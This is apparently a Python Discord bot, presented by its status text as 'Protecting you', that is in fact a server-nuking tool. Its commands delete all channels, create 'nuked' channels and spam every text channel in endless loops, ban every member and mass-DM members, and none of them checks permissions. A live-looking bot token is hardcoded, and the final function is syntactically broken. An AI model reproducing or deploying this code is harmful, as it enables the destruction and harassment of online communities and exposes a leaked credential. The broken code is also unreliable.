from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands
from itertools import cycle

status=cycle(["Protecting you"])

client = commands.Bot(command_prefix = '.')
client.remove_command('help')
token = 'ODM1NTI2OTI1MTI3NTE2MjIx.YIQvFg.hdn7b7WgAI8S3-1XDeWYTXWd3Oo'




@client.command()
async def destroy (ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel("nuked")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel("nuked")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass   

@client.command()
async def banall(ctx, reason=None):
  await ctx.message.delete()
  for member in ctx.guild.members:
    await member.ban(reason=reason)

@client.command()
async def dmall(ctx,message):
  members=ctx.guild.members
  await ctx.message.delete()
  for member in members:
     try:
          await member.send(f"{message}")

client.run(token)
